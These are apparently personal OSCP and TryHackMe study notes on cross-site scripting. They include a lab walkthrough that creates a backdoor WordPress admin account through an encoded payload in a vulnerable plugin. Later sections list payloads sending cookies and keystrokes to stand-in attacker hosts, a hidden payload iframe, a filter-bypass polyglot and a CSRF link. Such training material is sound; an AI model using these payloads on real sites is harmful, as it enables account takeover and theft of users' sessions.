XSS vulnerability is created when a web page allows unsanitized data.
Sanitizing data processes user input so that all dangerous characters or strings are removed or transformed.

Regardless of how the XSS payload is delivered and executed, the injected scripts run under the context of the user viewing the affected page.  
It's the user’s browser, not the web application, executes the XSS payload.  
These attacks can have a significant impact resulting in session hijacking, forced redirection to malicious pages, execution of local applications as that user, etc.  

[BeEF](BeEF.md) - Can leverage XSS vulns to launch many different client-side attacks.  

### Common Entry points

- URL query parameters
- POST parameters
- HTTP headers
	- User-Agent
	- Referer
	- Cookies

# Stored vs Reflected
## Stored
- aka: Persistent XSS, occurs when the exploit payload is stored in a database or otherwise cached by a server.  
- The web application then retrieves this payload and displays it to anyone that views a vulnerable page.  
- A single Stored XSS vulnerability can therefore attack all users of the site.  
- Exists in:
	- forum software
	- comment sections
	- product reviews

## Reflected
- Usually include the payload in a crafted request or link.  
- The web application takes this value and places it into the page content.  
- This variant only attacks the person submitting the request or viewing the link.  
- User-supplied data in an HTTP request is included in the webpage source without any validation.  
- Occurs in:
	- search fields and results
	- anywhere user input is included in error messages.  

## DOM-based
- Similar to previous two, but takes place solely within the page’s Document Object Model (DOM).  
- A browser parses a page’s HTML content and generates an internal DOM representation.  
- JavaScript can programmatically interact with this DOM.  
- Occurs when a page’s DOM is modified with user-controlled values.  
- DOM-based XSS can be stored or reflected.  
- The key difference is that DOM-based XSS attacks occur when a browser (not the web app) parses the page’s content and the inserted JavaScript is executed.  

## Blind
- Similar to stored, however you can't see it working or be able to test for it on yourself.  
- Ex: Injecting into a staff contact form where the malicious code gets turned into a support ticket which the staff views on a private web portal.
  
# Javascript

When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it.
The DOM is comprised of all forms, inputs, images, etc. related to the web page.

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience.

If we can inject JavaScript code into the application, we can access and modify the page's DOM.
With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.

Ex of simple JS function:
```javascript
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```




# Ajax

The main object that allows interaction with remote servers is *XMLHttpRequest* (XHR)
- XMLHttpRequest allows retrieval of data from a URL without having to refresh the whole web page
- The request is sent in the background
- Once the request completes a developer defined function can be called
- This allows a web application to update the DOM without disturbing what the user is doing

*XMLHttpRequest* has a number of useful properties and methods
- *readyState* property returns the state an XMLHttpRequest client is in:
	- 0 = UNSENT – Created but open() not called yet
	- 1 = OPENED – open() has been called
	- 2 = SENT - send() has been called, & headers and status are available
	- 3 = LOADING - downloading
	- 4 = DONE - complete
- By inspecting the *readyState*, the web app can change its behavior

- *open()* – Initializes a request and allows the method to be defined
- *withCredentials* – Property specifying if the request should contain cookies
	- Otherwise the request is sent without cookies
- *onreadystatechange* – Property containing an event handler (a function) that will be called whenever *readyState* changes
	- If readyState is 4, the request has finished
- *response* – Property containing the response body
	- Type depends on the *responseType* property
- *responseText* – Property containing response body as text
- *status* – Property containing status code of the response

# Encoding

Most common types:
- HTML encoding (character references)
	- Used to display characters that have special meanings
		- Ex:   "<" is the character reference for "<". When encountering this type of encoding, the browser will not interpret the character as the start of an element, but will display the actual character as-is.
- URL encoding (% encoding)
	- Ex:  Space is %20


If we can inject these special characters into the page, the browser will treat them as code elements.
We may need to use different sets of characters, depending on where our input is being included.

Ex:
- If added between _div_ tags
	- need to include our own _script_ tags and
	- need to be able to inject "<" and ">" as part of the payload.
- If added within an existing JavaScript tag
	- might only need quotes and semicolons to add our own code.


# ID'ing
Identify input fields which display input data as output in subsequent pages.  
By entering characters that are used in common scripting languages, we can find out what's filtered/ sanitized and what's not.  

## ID Stored
- Comments on a blog  
- User profile information  
- Website Listings  
## ID Reflective
- Parameters in the URL Query String  
- URL File Path  
- Sometimes HTTP Headers  
## ID DOM 
- Challenging to test for, requires a certain amount of knowledge of JS.  
- Look for parts of code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.  
- Then need to see how they are handled & whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**.  

# Testing

### Most common characters used
```javascript
< > ' " { } ;
```
	 JavaScript and HTML

- HTML uses _**<**_ and _**>**_ to denote elements
- JS uses _**{**_ and _**}**_ in function declarations
- _**'**_ and _**"**_ are used to denote strings
- _**;**_ is used to denote end of a statement

### Determine which characters get filtered or encoded
```javascript
<>()='"/;[]{}$--#&//
```
	Note:  first / used for escaping ; and / chars

# Basic Attacks

### OSCP Example

Attack against Offsec's WordPress site.
- Running a plugin named *Visitors* that's vulnerable to stored-XSS
	- Main feature is to log website's visitor data:
		- IP
		- Source
		- User-Agent
		- etc
- Source code can be downloaded from the site

1. Inspecting the **database.php** script to verify how the data is stored
```php
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],    //<--- note
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```
	Visitor Plugin Record Creation Function
	- Responsible for parsing HTTP request headers
		- including User-Agent header stored into *useragent* record value


2. When a WP admin loads the *Visitor* plugin, the function will execute the following portion of code from **start.php**
```php
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>    //<--- note
        </tr>';
    $i--;
}
```
	Visitors Plugin Record Visualization Function
	- *useragent* record value is retrieved from the database and inserted in the Table Data (_td_) HTML tag, w/o any sort of data sanitization.

As the User-Agent is under our control, we can send to BurpSuite's Repeater to inject malicious JS code
![](xss_repeater.png)

With a 200 Response code, payload should be stored.

To verify
- Log in to the admin console at **http://offsecwp/wp-login.php** using the _admin/password_ creds
- Navigate to the Visitors plugin console at **http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php**
- Should see a banner popup stating '42'

# Privilege Escalation

Knowing that we can store JS code inside a target WP app and having it executed when loaded by an admin user, explore different avenues for obtaining admin privs.

If app uses an insecure session management configuration
- Leverage XSS to steal cookies & session info
- Masquerade as user within the target site.

## Cookies
- Tracks state and info about users
- Can be set w/ several optional flags
	- Secure
		- instructs the browser to only send the cookie over encrypted connections
		- Protects the cookie from being sent in cleartext and captured over the network
	- HttpOnly
		- Instructs the browser to deny access to the cookie by JavaScript
	- SameSite
		- Controls when the cookie is being sent in cross-site requests.
		- Protects against CSRF

Verify nature of WP's session cookies
- Log in as *admin* user
- Open Dev tools
- Navigate to *Storage* tab
- Click on _http://offsecwp_ under the _Cookies_ menu on the left
![](wp_cookies.png)
	6 cookies are stored, but only 4 are session cookies (see Expires/ Max-Age column)

As all session tokens have HttpOnly set to *true*, they can't be accessed by JS.
However, as JS code will be executed when an admin uses the *Visitors* plugin, we can create a new admin user.

## Attacking WP site via Visitors plugin - create new admin acct
	\* Code for Visitors plugin can be found at hxxps://downloads.wordpress[.]org/plugin/visitors-app.0.3.zip
		- will download zip full of plugin's contents

Using an attack similar to [Shift8](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)
1. Create a JS function that fetches the WordPress admin _nonce_ in order to perform any admin action
	- nonce is a server-generated token that is included in each HTTP request to add randomness and prevent CSRF attacks
	- by including and checking the pseudo-random nonce, WordPress prevents CSRF attacks as the attacker couldn't know what the nonce is
	- nonce won't be a problem w/ the stored XSS vuln discovered w/in the plugin
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";    //<--- note
var nonceRegex = /ser" value="([^"]*?)"/g;    //<--- note
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
...
```
	Get nonce
	- performs a new HTTP request towards the **/wp-admin/user-new.php** URL
	- saves the nonce value found in the HTTP response based on the regex.
	- the regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.

2. Craft the main function responsible for creating the new admin user (& add onto end of first bit of code)
```javascript
...
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";    //<--- note
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
	New backdoor admin
	If successful, grants full admin access to the entire WP installation

3. To ensure that our JavaScript payload will be handled correctly by Burp and the target application, first minify it
	1. Navigate to https://jscompress.com
	   ```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

4. Next encode it so any bad chars won't interfere with sending the payload
```javascript
function encode_to_javascript(string) {
		var input = string
		var output = '';
		for(pos = 0; pos < input.length; pos++) {
			output += input.charCodeAt(pos);
			if(pos != (input.length - 1)) {
				output += ",";
			}
		}
		return output;
	}
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
	- Parses the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the _charCodeAt_ method.
  .
	[_charCodeAt_]((https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt))

5. Navigate to about:config in browser and use the Console tab to craft encoded payload
   ![](xss_charCodeAt.png)
   
6. Send payload
	1. Use *fromCharCode* method to decode payload
	2. Put within *eval()* method to execute
	3. Use *curl* to launch the attack
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,...........41,59))</script>" --proxy 127.0.0.1:8080
```
	---proxy 127.0.0.1:8080  is used to send through BurpSuite
	Can leave Intercept ON in burp to inspect the request

7. Once everything looks good, Forward, and turn Intercept OFF.
8. Simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.
![](offsec_wp.png)
	Only 1 entry is present and no User-Agent recorded as the browser can't render any strings from \<script> tags

9. Verify attack succeeded by going to Users
![](offsec_wp_user.png)

Can now gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell.

#### CSRF
A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user
```html
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```
	URL link is pointing to a Fake Crypto Bank website API, which performs a bitcoin transfer to the attacker account
	Successful if the user is already logged in with a valid session on the same website.



# Removed from course

#####  Identifying what remains after filtering for XSS attacks  
```html
'';!--"<XSS>=&{()}
```


Even if a server returns the above w/ _**&lt**_ and _**&gt**_ in place of _**<**_ and _**>**_

##### Image tag injection
```html
SRC=javascript:alert('XSS')
```

  
##### Testing an HTML field
```html
<hr>
```
	can create an obvious indicator  
  
Different sets of characters may be needed depending on where our input is being included.  
For example, if our input is being added between div tags, we will need to include our own script tags and will need to be able to inject “<” and “>” as part of the payload.  
If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code.  
  

### Attacks:
- Implement pw guessing against internal web apps  
- Steal creds by creating a fake login prompt  
- Add browser keystroke logger  
- Take screenshot of browser page  
- Port scan internal servers  
- Redirect a form to an attacker  
- Capture microphone & camera  
- Deploy JS cryptominer  
- Retrieve user cookie token


##### Getting cookie
```html
<script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
```


##### Polyglots
A string of text which can escape attributes, tags and bypass filters all in one.  
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```


##### Content Injection
XSS vulns are often used to deliver client-side attacks as they allow the attacker to redirect the victim's browser to their choosing.  
A stealthier alternative is to inject an invisible I-frame"  
```html
<iframe src=http://attack.com/payload height="0" width="0"></iframe>
```


Can also redirect the victim browser to a client-side attack or to an information gathering script.  
(Need the User-Agent to determine the victim's browser)  
  

##### Stealing Cookies & Session Info
If the web app uses insecure session management, we can use XSS to steal a user's cookies and masquarade as that user within the target website.  
```html
<script>new Image().src="http://attackerip/cool.jpg?output="+document.cookie;</script>
```

  
Once a logged in user visits the affected page, their session data is sent to the attacker's ip ([nc](Tools.md#netcat) listener)
![[cookie_steal.png]]

##### Cookie Editor
Cookie setting and management add-on for Firefox  
  
***Note:** This attack is session-specific. Once we steal the session, we can masquerade as the victim until they log out or their session expires.  
  
We're now able to set our cookie name=value pair to **PHPSESSID=delkcrm4vdkgqcqvkrs7ehlghe  
**  
  
  
##### Keylogger
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
	btoa - base64 encode  
  
  
##### Change Email
```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```
